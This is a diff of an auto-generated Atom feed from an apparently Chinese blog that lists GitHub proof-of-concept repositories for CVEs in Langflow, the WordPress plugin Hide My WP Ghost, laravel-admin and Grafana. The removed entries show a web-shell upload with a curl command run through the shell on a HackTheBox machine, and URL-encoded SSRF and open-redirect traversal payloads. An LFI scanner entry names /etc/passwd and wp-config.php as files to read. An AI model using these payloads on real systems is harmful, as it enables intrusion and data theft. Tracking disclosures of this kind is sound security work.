@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-22T15:45:11.897Z</updated>
+  <updated>2025-06-22T16:15:19.382Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,60 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Langflow 未授权远程代码执行漏洞</title>
+    <link href="http://example.com/2025/06/22/github_4226021875/"/>
+    <id>http://example.com/2025/06/22/github_4226021875/</id>
+    <published>2025-06-22T16:15:19.383Z</published>
+    <updated>2025-06-22T16:15:19.382Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Langflow 未授权远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-3248</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> CVE-2025-3248漏洞存在于Langflow中，由于不安全的Python exec使用，导致未授权的远程代码执行。</p><p><strong>产品名称：</strong> Langflow</p><p><strong>来源：</strong> <a href="https://github.com/B1ack4sh/Blackash-CVE-2025-3248">https://github.com/B1ack4sh/Blackash-CVE-2025-3248</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="Blackash-CVE-2025-3248"><a href="#Blackash-CVE-2025-3248" class="headerlink" title="Blackash-CVE-2025-3248"></a>Blackash-CVE-2025-3248</h2><p>CVE-2025-3248 – Unauthenticated Remote Code Execution in Langflow via Insecure Python exec Usage</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Langflow 未授权远程代码执行漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Hide My WP Ghost 本地文件包含漏洞</title>
+    <link href="http://example.com/2025/06/22/github_1328389436/"/>
+    <id>http://example.com/2025/06/22/github_1328389436/</id>
+    <published>2025-06-22T16:15:12.715Z</published>
+    <updated>2025-06-22T16:15:12.714Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Hide My WP Ghost 本地文件包含漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-26909</li></ul><p><strong>漏洞类型：</strong> 文件包含</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> CVE-2025-26909是WordPress插件’Hide My WP Ghost’中的一个严重的本地文件包含（LFI）漏洞，影响版本&lt;&#x3D;5.4.01。此漏洞允许攻击者通过滥用未正确验证的文件路径输入来读取服务器上的任意文件，可能导致敏感信息泄露或远程代码执行。</p><p><strong>产品厂商：</strong> Hide My WP Ghost</p><p><strong>产品名称：</strong> Hide My WP Ghost</p><p><strong>影响版本：</strong> &lt;&#x3D; 5.4.01</p><p><strong>来源：</strong> <a href="https://github.com/issamjr/CVE-2025-26909-Scanner">https://github.com/issamjr/CVE-2025-26909-Scanner</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li><li>requirements.txt</li><li>scanner.py</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-26909-Vulnerability-Scanner"><a href="#CVE-2025-26909-Vulnerability-Scanner" class="headerlink" title="CVE-2025-26909 Vulnerability Scanner"></a>CVE-2025-26909 Vulnerability Scanner</h2><p>A Python-based scanner and proof-of-concept script for detecting CVE-2025-26909 in WordPress plugin “Hide My WP Ghost” by Issam Junior.</p><h3 id="🔍-Vulnerability-Overview"><a href="#🔍-Vulnerability-Overview" class="headerlink" title="🔍 Vulnerability Overview"></a>🔍 Vulnerability Overview</h3><p><strong>CVE-2025-26909</strong> is a critical Local File Inclusion (LFI) vulnerability found in versions &lt;&#x3D; 5.4.01 of the “Hide My WP Ghost” plugin. This flaw allows attackers to read arbitrary files on the server by abusing improperly validated file path inputs.</p><h3 id="💥-Impact"><a href="#💥-Impact" class="headerlink" title="💥 Impact"></a>💥 Impact</h3><p>Attackers may exploit this flaw to:</p><ul><li>View sensitive files such as <code>/etc/passwd</code>, <code>wp-config.php</code>.</li><li>Execute remote PHP code using LFI chains if combined with other misconfigurations.</li></ul><h3 id="🛡️-Mitigation"><a href="#🛡️-Mitigation" class="headerlink" title="🛡️ Mitigation"></a>🛡️ Mitigation</h3><ul><li>Update the plugin to version <strong>5.4.02 or newer</strong>.</li><li>Disable the “Change Paths” feature if it is not needed.</li><li>Apply file inclusion filtering and file access hardening (AppArmor, chroot, etc).</li></ul><h3 id="🚀-Usage"><a href="#🚀-Usage" class="headerlink" title="🚀 Usage"></a>🚀 Usage</h3><h4 id="1-Clone-the-tool"><a href="#1-Clone-the-tool" class="headerlink" title="1. Clone the tool"></a>1. Clone the tool</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/issamjr/CVE-2025-26909-Scanner.git<br><span class="hljs-built_in">cd</span> CVE-2025-26909-Scanner<br></code></pre></td></tr></table></figure><h4 id="2-Install-dependencies"><a href="#2-Install-dependencies" class="headerlink" title="2. Install dependencies"></a>2. Install dependencies</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install -r requirements.txt<br></code></pre></td></tr></table></figure><h4 id="3-Run-the-scanner"><a href="#3-Run-the-scanner" class="headerlink" title="3. Run the scanner"></a>3. Run the scanner</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 scanner.py http://example.com/<br></code></pre></td></tr></table></figure><h3 id="📁-Output-Format"><a href="#📁-Output-Format" class="headerlink" title="📁 Output Format"></a>📁 Output Format</h3><ul><li><code>[+]</code> Vulnerable</li><li><code>[-]</code> Not Vulnerable</li><li><code>[*]</code> Checking</li><li><code>[!]</code> Errors</li></ul><h3 id="👨‍💻-Author"><a href="#👨‍💻-Author" class="headerlink" title="👨‍💻 Author"></a>👨‍💻 Author</h3><ul><li>Issam Junior</li><li>Telegram: <a href="https://t.me/issamiso">@issamiso</a></li><li>GitHub: <a href="https://github.com/issamjr">issamjr</a></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Hide My WP Ghost 本地文件包含漏洞&lt;/p&gt;
+&lt;p&gt;&lt;stron</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+    <category term="文件包含" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
+    
+  </entry>
   
   <entry>
     <title>Wowza Streaming Engine 版本泄露漏洞</title>
@@ -490,60 +544,6 @@
     <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
     
     <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>laravel-admin 任意文件上传漏洞</title>
-    <link href="http://example.com/2025/06/21/github_2677753178/"/>
-    <id>http://example.com/2025/06/21/github_2677753178/</id>
-    <published>2025-06-21T16:45:12.647Z</published>
-    <updated>2025-06-21T16:45:12.644Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> laravel-admin 任意文件上传漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2023-24249</li></ul><p><strong>漏洞类型：</strong> 文件上传</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> CVE-2023-24249是laravel-admin v1.8.19中的一个任意文件上传漏洞。此概念验证利用该漏洞上传了一个网页外壳。</p><p><strong>产品名称：</strong> laravel-admin</p><p><strong>影响版本：</strong> v1.8.19</p><p><strong>来源：</strong> <a href="https://github.com/ldb33/CVE-2023-24249-PoC">https://github.com/ldb33/CVE-2023-24249-PoC</a></p><p><strong>类型：</strong> CVE-2023:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>CVE-2023-24249.py</li><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2023-24249-PoC"><a href="#CVE-2023-24249-PoC" class="headerlink" title="CVE-2023-24249 PoC"></a>CVE-2023-24249 PoC</h2><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-24249">CVE-2023-24249</a> is an arbitrary file upload vulnerability in laravel-admin v1.8.19. This proof of concept exploits the vulnerability to upload a web shell.</p><p>The exploit was written to use against the HackTheBox easy machine <a href="https://app.hackthebox.com/machines/Usage">Usage</a>.</p><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">python3 CVE<span class="hljs-number">-2023</span><span class="hljs-number">-24249.</span>py<br>[+] Web shell uploaded <span class="hljs-keyword">to</span> http://<span class="hljs-keyword">admin</span>.<span class="hljs-keyword">usage</span>.htb/uploads/images/df18111ffa9f40264b52624c7d7d21b1.php<br><br>curl http://<span class="hljs-keyword">admin</span>.<span class="hljs-keyword">usage</span>.htb/uploads/images/df18111ffa9f40264b52624c7d7d21b1.php?c=id                                            <br>uid=<span class="hljs-number">1000</span>(dash) gid=<span class="hljs-number">1000</span>(dash) <span class="hljs-keyword">groups</span>=<span class="hljs-number">1000</span>(dash)<br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; laravel-admin 任意文件上传漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="CVE-2023:github search" scheme="http://example.com/tags/CVE-2023-github-search/"/>
-    
-    <category term="文件上传" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Grafana 服务端请求伪造漏洞</title>
-    <link href="http://example.com/2025/06/21/github_2664599926/"/>
-    <id>http://example.com/2025/06/21/github_2664599926/</id>
-    <published>2025-06-21T15:15:12.650Z</published>
-    <updated>2025-06-21T15:15:12.650Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Grafana 服务端请求伪造漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-4123</li></ul><p><strong>漏洞类型：</strong> 服务端请求伪造</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Grafana存在服务端请求伪造（SSRF）漏洞，攻击者可以通过构造特定的URL请求，利用该漏洞进行未授权的服务端请求。此外，还存在开放重定向漏洞，攻击者可以构造特定的URL路径，将用户重定向到恶意网站。</p><p><strong>产品厂商：</strong> Grafana</p><p><strong>产品名称：</strong> Grafana</p><p><strong>来源：</strong> <a href="https://github.com/punitdarji/Grafana-cve-2025-4123">https://github.com/punitdarji/Grafana-cve-2025-4123</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li><li>docker-compose.yml</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="Grafana-cve-2025-4123"><a href="#Grafana-cve-2025-4123" class="headerlink" title="Grafana-cve-2025-4123"></a>Grafana-cve-2025-4123</h2><h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost:<span class="hljs-number">3000</span>/render/public/..%<span class="hljs-number">252</span>f%<span class="hljs-number">255</span>C&#123;&#123;OpenRedirectURL&#125;&#125;%<span class="hljs-number">252</span>f%<span class="hljs-number">253</span>F%<span class="hljs-number">252</span>f..%<span class="hljs-number">252</span>f..<br></code></pre></td></tr></table></figure><h4 id="Open-Redirect"><a href="#Open-Redirect" class="headerlink" title="Open Redirect"></a>Open Redirect</h4><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/public/..<span class="hljs-variable">%2</span>F<span class="hljs-variable">%5</span><span class="hljs-keyword">c</span>&#123;website.com&#125;<span class="hljs-variable">%2</span>F<span class="hljs-variable">%3</span>f<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>F..<br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Grafana 服务端请求伪造漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
-    
-    <category term="服务端请求伪造" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
     
   </entry>
   
